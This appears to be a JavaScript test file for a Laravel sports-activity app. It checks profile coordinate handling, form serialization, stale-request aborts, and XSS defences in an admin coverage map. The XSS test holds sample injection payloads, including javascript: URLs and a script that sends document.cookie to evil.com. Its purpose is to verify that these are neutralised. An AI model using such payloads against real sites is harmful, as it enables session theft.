import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import vm from 'node:vm';
import { fileURLToPath } from 'node:url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

class MockElement {
    constructor(tagName, id = '', className = '') {
        this.tagName = tagName.toLowerCase();
        this.id = id;
        this.className = className;
        this.checked = false;
        this.disabled = false;
        this.required = false;
        this.value = '';
        this.style = { display: '' };
        this.attributes = {};
        this.children = [];
        this.parentNode = null;
        this.listeners = {};
        this._innerHTML = '';
        this._textContent = '';

        this.classList = {
            contains: (cls) => this.className.split(/\s+/).filter(Boolean).includes(cls),
            add: (cls) => {
                const parts = this.className.split(/\s+/).filter(Boolean);
                if (!parts.includes(cls)) {
                    parts.push(cls);
                    this.className = parts.join(' ');
                }
            },
            remove: (cls) => {
                this.className = this.className.split(/\s+/).filter(c => c && c !== cls).join(' ');
            },
        };
    }

    get innerHTML() {
        if (this._innerHTML) return this._innerHTML;
        return this.children.map(c => c.outerHTML || c.textContent || '').join('');
    }

    set innerHTML(val) {
        this._innerHTML = String(val);
        if (val === '') {
            this.children = [];
            this._textContent = '';
        }
    }

    get textContent() {
        if (this._textContent) return this._textContent;
        return this.children.map(c => c.textContent || '').join('');
    }

    set textContent(val) {
        this._textContent = String(val);
        this._innerHTML = '';
        this.children = [];
    }

    get outerHTML() {
        const tag = this.tagName;
        const attrs = Object.entries(this.attributes).map(([k, v]) => ` ${k}="${v}"`).join('');
        return `<${tag} id="${this.id}" class="${this.className}"${attrs}>${this.innerHTML || this.textContent}</${tag}>`;
    }

    setAttribute(name, value) {
        this.attributes[name] = String(value);
    }

    getAttribute(name) {
        return this.attributes[name] ?? null;
    }

    appendChild(child) {
        child.parentNode = this;
        this.children.push(child);
        return child;
    }

    removeChild(child) {
        const idx = this.children.indexOf(child);
        if (idx !== -1) {
            this.children.splice(idx, 1);
            child.parentNode = null;
        }
        return child;
    }

    addEventListener(event, fn) {
        if (!this.listeners[event]) this.listeners[event] = [];
        this.listeners[event].push(fn);
    }

    trigger(event, eventObj = {}) {
        const handlers = this.listeners[event] || [];
        for (const fn of handlers) {
            fn.call(this, { target: this, type: event, ...eventObj });
        }
    }

    querySelectorAll(selector) {
        const matches = [];
        const check = (el) => {
            const parts = selector.split(',').map(s => s.trim());
            let matched = false;
            for (const sel of parts) {
                if (sel.startsWith('.')) {
                    const cls = sel.slice(1);
                    if (el.className.split(/\s+/).includes(cls)) matched = true;
                } else if (sel.startsWith('#')) {
                    if (el.id === sel.slice(1)) matched = true;
                } else if (el.tagName === sel.toLowerCase()) {
                    matched = true;
                }
            }
            if (matched && el !== this) matches.push(el);
            for (const child of el.children) {
                check(child);
            }
        };
        check(this);
        return matches;
    }

    querySelector(selector) {
        const res = this.querySelectorAll(selector);
        return res.length > 0 ? res[0] : null;
    }
}

class MockFormData {
    constructor(form) {
        this.entriesList = [];
        if (form) {
            const collect = (el) => {
                if (el.tagName === 'input' || el.tagName === 'select' || el.tagName === 'textarea') {
                    const name = el.getAttribute('name') || el.id;
                    if (name) {
                        if (el.tagName === 'input' && el.getAttribute('type') === 'checkbox') {
                            if (el.checked) this.entriesList.push([name, el.value || '1']);
                        } else {
                            this.entriesList.push([name, el.value || '']);
                        }
                    }
                }
                for (const c of el.children) collect(c);
            };
            collect(form);
        }
    }
    entries() {
        return this.entriesList[Symbol.iterator]();
    }
}

function createMockDocument(root) {
    const allElements = new Map();
    const docListeners = {};

    function register(el) {
        if (el.id) allElements.set(el.id, el);
        for (const child of el.children) {
            register(child);
        }
    }
    register(root);

    return {
        root,
        readyState: 'complete',
        createElement: (tag) => new MockElement(tag),
        createTextNode: (text) => {
            const node = new MockElement('span');
            node.textContent = String(text);
            return node;
        },
        getElementById: (id) => allElements.get(id) || null,
        querySelectorAll: (sel) => root.querySelectorAll(sel),
        querySelector: (sel) => root.querySelector(sel),
        addEventListener: (evt, fn) => {
            if (!docListeners[evt]) docListeners[evt] = [];
            docListeners[evt].push(fn);
        },
        trigger: (evt, data = {}) => {
            const handlers = docListeners[evt] || [];
            for (const fn of handlers) fn(data);
        },
    };
}

const mockLeaflet = {
    map: () => {
        const mapObj = {
            setView: function() { return this; },
            addTo: function() { return this; },
            addLayer: function() { return this; },
            removeLayer: function() { return this; },
            on: function() { return this; },
            flyTo: function() { return this; }
        };
        return mapObj;
    },
    tileLayer: () => ({
        addTo: function() { return this; }
    }),
    marker: (latlng) => ({
        addTo: function() { return this; },
        bindPopup: function() { return this; },
        setLatLng: function() { return this; },
        on: function() { return this; },
        getLatLng: () => ({ lat: latlng[0], lng: latlng[1] })
    }),
    markerClusterGroup: () => ({
        clearLayers: () => {},
        addLayers: () => {},
        addLayer: () => {}
    }),
    divIcon: (opts) => opts,
    Icon: { Default: { imagePath: '' } }
};

// ==========================================
// Test 1: profile coordinate0 clear
// ==========================================
test('profile coordinate0 clear: coordinate 0 is valid and clear button resets both inputs and removes marker', () => {
    const bladePath = path.join(__dirname, '../../resources/views/panel/profile.blade.php');
    const bladeSource = fs.readFileSync(bladePath, 'utf8');

    const match = bladeSource.match(/<script>([\s\S]*?)<\/script>/);
    assert.ok(match, 'script tag must exist in profile.blade.php');

    let script = match[1];
    // Replace Blade interpolation
    script = script.replace(/\{\{\s*asset\([^)]+\)\s*\}\}/g, '/assets/test');
    script = script.replace(/\{\{\s*Route::has\([^)]+\)\s*\?[^:]+:[^}]+/g, '"/panel/activities"');

    const root = new MockElement('div', 'root');
    const mapEl = new MockElement('div', 'profileMap');
    root.appendChild(mapEl);

    const latInput = new MockElement('input', 'latitude');
    latInput.setAttribute('name', 'latitude');
    latInput.value = '0';
    root.appendChild(latInput);

    const lngInput = new MockElement('input', 'longitude');
    lngInput.setAttribute('name', 'longitude');
    lngInput.value = '0';
    root.appendChild(lngInput);

    const clearBtn = new MockElement('button', 'btnClearCoordinates');
    root.appendChild(clearBtn);

    const mockDoc = createMockDocument(root);
    const sandbox = {
        document: mockDoc,
        window: {
            location: { origin: 'http://localhost:7000' }
        },
        L: mockLeaflet,
        Number,
        parseFloat,
        FormData: MockFormData,
        console,
    };

    vm.runInNewContext(script, sandbox);
    mockDoc.trigger('DOMContentLoaded');

    const profileUI = sandbox.window.ProfileUI;
    assert.ok(profileUI, 'window.ProfileUI must be defined');

    // 1. Coordinate 0 is valid!
    assert.equal(profileUI.hasValidCoordinates('0', '0'), true);
    assert.equal(profileUI.hasValidCoordinates(0, 0), true);
    assert.equal(profileUI.hasValidCoordinates('-6.9175', '107.6191'), true);

    // Empty or invalid coordinates return false
    assert.equal(profileUI.hasValidCoordinates('', ''), false);
    assert.equal(profileUI.hasValidCoordinates(null, null), false);
    assert.equal(profileUI.hasValidCoordinates('999', '0'), false); // lat > 90

    // 2. Clear button resets both inputs to empty string and removes marker
    assert.equal(latInput.value, '0');
    assert.equal(lngInput.value, '0');

    clearBtn.trigger('click');

    assert.equal(latInput.value, '', 'Latitude must be empty string after clear');
    assert.equal(lngInput.value, '', 'Longitude must be empty string after clear');
    assert.equal(sandbox.window._profileMarker, null, 'Marker must be removed after clear');
});

// ==========================================
// Test 2: fieldserialization with title (not name)
// ==========================================
test('profile fieldserialization: activity form serializes title, cabor, schedule, location, is_active', () => {
    const bladePath = path.join(__dirname, '../../resources/views/panel/profile.blade.php');
    const bladeSource = fs.readFileSync(bladePath, 'utf8');

    const match = bladeSource.match(/<script>([\s\S]*?)<\/script>/);
    assert.ok(match, 'script tag must exist in profile.blade.php');

    let script = match[1];
    script = script.replace(/\{\{\s*asset\([^)]+\)\s*\}\}/g, '/assets/test');

    const root = new MockElement('div', 'root');
    const form = new MockElement('form', 'formAddActivity');
    root.appendChild(form);

    const titleInput = new MockElement('input', 'activity_title');
    titleInput.setAttribute('name', 'title');
    titleInput.value = 'Latihan Rutin Tim U-16';
    form.appendChild(titleInput);

    const caborSelect = new MockElement('select', 'activity_sport_category_id');
    caborSelect.setAttribute('name', 'sport_category_id');
    caborSelect.value = '1';
    form.appendChild(caborSelect);

    const scheduleInput = new MockElement('input', 'activity_schedule');
    scheduleInput.setAttribute('name', 'schedule');
    scheduleInput.value = 'Selasa & Kamis, 16.00';
    form.appendChild(scheduleInput);

    const locationInput = new MockElement('input', 'activity_location');
    locationInput.setAttribute('name', 'location');
    locationInput.value = 'GOR Padjajaran';
    form.appendChild(locationInput);

    const dateInput = new MockElement('input', 'activity_scheduled_at');
    dateInput.setAttribute('name', 'scheduled_at');
    dateInput.value = '2026-10-25T16:00';
    form.appendChild(dateInput);

    const descInput = new MockElement('textarea', 'activity_description');
    descInput.setAttribute('name', 'description');
    descInput.value = 'Fokus drills fundamental dan tactical passing.';
    form.appendChild(descInput);

    const activeCheck = new MockElement('input', 'activity_is_active');
    activeCheck.setAttribute('type', 'checkbox');
    activeCheck.setAttribute('name', 'is_active');
    activeCheck.checked = true;
    activeCheck.value = '1';
    form.appendChild(activeCheck);

    const mockDoc = createMockDocument(root);
    const sandbox = {
        document: mockDoc,
        window: {},
        L: mockLeaflet,
        Number,
        parseFloat,
        FormData: MockFormData,
        console,
    };

    vm.runInNewContext(script, sandbox);

    const profileUI = sandbox.window.ProfileUI;
    const serialized = profileUI.serializeProgramFormData(form);

    // Assert exact field serialization per model contract: 'title' not 'name'!
    assert.equal(serialized.title, 'Latihan Rutin Tim U-16');
    assert.equal(serialized.name, undefined, 'Form must NOT serialize as name');
    assert.equal(serialized.sport_category_id, '1');
    assert.equal(serialized.schedule, 'Selasa & Kamis, 16.00');
    assert.equal(serialized.location, 'GOR Padjajaran');
    assert.equal(serialized.scheduled_at, '2026-10-25T16:00');
    assert.equal(serialized.description, 'Fokus drills fundamental dan tactical passing.');
    assert.equal(serialized.is_active, '1');
});

// ==========================================
// Test 3: mapdetails XSS & safeURLs whitelist
// ==========================================
test('coverage map details XSS: DOM textContent neutralizes HTML injection and safeURLs whitelist blocks malicious protocols', () => {
    const bladePath = path.join(__dirname, '../../resources/views/admin/coverage-map/index.blade.php');
    const bladeSource = fs.readFileSync(bladePath, 'utf8');

    const match = bladeSource.match(/<script>([\s\S]*?)<\/script>/);
    assert.ok(match, 'script tag must exist in coverage-map index.blade.php');

    let script = match[1];
    script = script.replace(/\{\{\s*route\([^)]+\)\s*\}\}/g, '/admin/coverage-map/test');
    script = script.replace(/\{\{\s*Route::has\([^)]+\)[\s\S]*?\}\}/g, '/admin/coverage-map/details');

    const root = new MockElement('div', 'root');
    const container = new MockElement('div', 'detail-content');
    root.appendChild(container);

    const mockDoc = createMockDocument(root);
    const sandbox = {
        document: mockDoc,
        window: {
            location: { origin: 'http://localhost:7000' }
        },
        URL,
        L: mockLeaflet,
        Number,
        console,
    };

    vm.runInNewContext(script, sandbox);

    const mapUI = sandbox.window.CoverageMapUI;
    assert.ok(mapUI, 'window.CoverageMapUI must be defined');

    // 1. Test safe URL whitelist
    assert.equal(mapUI.isSafeUrl('/admin/schools/101'), true, 'Relative URL is safe');
    assert.equal(mapUI.isSafeUrl('http://localhost:7000/admin/communities/5'), true, 'Same-origin URL is safe');
    assert.equal(mapUI.isSafeUrl('javascript:alert(document.cookie)'), false, 'javascript: URL must be blocked');
    assert.equal(mapUI.isSafeUrl('data:text/html,<script>alert(1)</script>'), false, 'data: URL must be blocked');
    assert.equal(mapUI.isSafeUrl('https://malicious-phishing.com/login'), false, 'External origin must be blocked');
    assert.equal(mapUI.isSafeUrl('//evil.com/redirect'), false, 'Protocol-relative external URL must be blocked');

    // 2. Test XSS protection in detail rendering
    const maliciousPayload = {
        entity: {
            name: '<script>alert("xss-name")</script><img src=x onerror=alert(1)>',
            type: 'school',
            subtype: '<b onmouseover=alert(2)>SMP</b>',
            npsn: '<svg onload=alert(3)>20219278',
            address: '<iframe src="javascript:alert(4)">Jl. Terusan</i>',
            status: 'verified',
            coordinate_source: '<script>steal()</script>Master Dapodik'
        },
        sports: [
            { id: 1, name: '<script>alert("sport")</script>Basketball' }
        ],
        activities: [
            {
                name: '<img src=x onerror=alert(5)>Latihan Ekstrakurikuler',
                schedule: '<script>alert(6)</script>Setiap Jumat 15:00',
                location: '<a href="javascript:alert(7)">GOR Saparua</a>',
                description: '<script>fetch("http://evil.com?c="+document.cookie)</script>Deskripsi rutin'
            }
        ],
        events: [
            {
                title: '<script>alert("ev")</script>Kejuaraan Pelajar 2026',
                sport_name: 'Basket',
                status: 'published'
            }
        ],
        links: {
            admin_detail: '/admin/schools/101',
            hack_link: 'javascript:alert(99)',
            phish_link: 'https://evil.com/steal'
        }
    };

    mapUI.renderEntityDetails(maliciousPayload, container);

    // Verify DOM structure:
    // NO script, img, iframe, svg, or onmouseover attributes parsed into DOM tree!
    assert.equal(container.querySelectorAll('script').length, 0, 'No script tags in DOM tree');
    assert.equal(container.querySelectorAll('img').length, 0, 'No img tags in DOM tree');
    assert.equal(container.querySelectorAll('iframe').length, 0, 'No iframe tags in DOM tree');
    assert.equal(container.querySelectorAll('svg').length, 0, 'No svg tags in DOM tree');

    // Verify textContent preserves the exact raw string without execution
    const headerTitle = container.querySelector('h5');
    assert.ok(headerTitle);
    assert.equal(headerTitle.textContent, maliciousPayload.entity.name);
    assert.equal(headerTitle.children.length, 0, 'h5 must not have element children');

    // Verify links: only the safe same-origin link was rendered!
    const renderedLinks = container.querySelectorAll('a');
    assert.equal(renderedLinks.length, 1, 'Only safe same-origin link must be rendered');
    assert.equal(renderedLinks[0].getAttribute('href'), '/admin/schools/101');
});

// ==========================================
// Test 4: staleresponse discard & AbortController
// ==========================================
test('coverage map staleresponse: rapid requests discard older responses and trigger abort on pending fetch', async () => {
    const bladePath = path.join(__dirname, '../../resources/views/admin/coverage-map/index.blade.php');
    const bladeSource = fs.readFileSync(bladePath, 'utf8');

    const match = bladeSource.match(/<script>([\s\S]*?)<\/script>/);
    let script = match[1];
    script = script.replace(/\{\{\s*route\([^)]+\)\s*\}\}/g, '/admin/coverage-map/test');
    script = script.replace(/\{\{\s*Route::has\([^)]+\)[\s\S]*?\}\}/g, '/admin/coverage-map/details');

    const root = new MockElement('div', 'root');
    const container = new MockElement('div', 'detail-content');
    root.appendChild(container);
    const placeholder = new MockElement('div', 'detail-placeholder');
    root.appendChild(placeholder);
    const loading = new MockElement('div', 'detail-loading');
    root.appendChild(loading);
    const closeBtn = new MockElement('button', 'btn-close-detail');
    root.appendChild(closeBtn);

    const abortedSignals = [];
    const fetchCalls = [];

    // Custom mock fetch to simulate race condition
    const mockFetch = (url, opts) => {
        fetchCalls.push({ url, signal: opts?.signal });
        if (opts?.signal) {
            opts.signal.addEventListener?.('abort', () => {
                abortedSignals.push(url);
            });
        }
        return new Promise((resolve) => {
            // Delay response for entity 10, immediate for entity 20
            const delay = url.includes('id=10') ? 50 : 5;
            setTimeout(() => {
                const entityId = url.includes('id=10') ? 10 : 20;
                resolve({
                    ok: true,
                    json: async () => ({
                        entity: {
                            id: entityId,
                            name: `Entitas ${entityId}`,
                            type: 'school'
                        }
                    })
                });
            }, delay);
        });
    };

    const mockDoc = createMockDocument(root);
    const sandbox = {
        document: mockDoc,
        window: {
            location: { origin: 'http://localhost:7000' }
        },
        fetch: mockFetch,
        AbortController,
        URL,
        L: mockLeaflet,
        Number,
        console,
    };

    vm.runInNewContext(script, sandbox);
    const mapUI = sandbox.window.CoverageMapUI;

    // Trigger request 1 for entity 10
    mapUI.fetchEntityDetails('school', 10);
    // Immediately trigger request 2 for entity 20 before request 1 returns
    mapUI.fetchEntityDetails('school', 20);

    // Wait for both promises to resolve
    await new Promise(r => setTimeout(r, 100));

    // Request 1 must have been aborted
    assert.equal(fetchCalls.length, 2);
    assert.ok(fetchCalls[0].signal.aborted, 'Request 1 signal must be aborted');

    // Final displayed entity in detail-content must be Entity 20, NOT overwritten by delayed Entity 10!
    const titleEl = container.querySelector('h5');
    assert.ok(titleEl, 'h5 title element must exist');
    assert.equal(titleEl.textContent, 'Entitas 20', 'Container must show Entity 20 details, stale Entity 10 discarded');
});
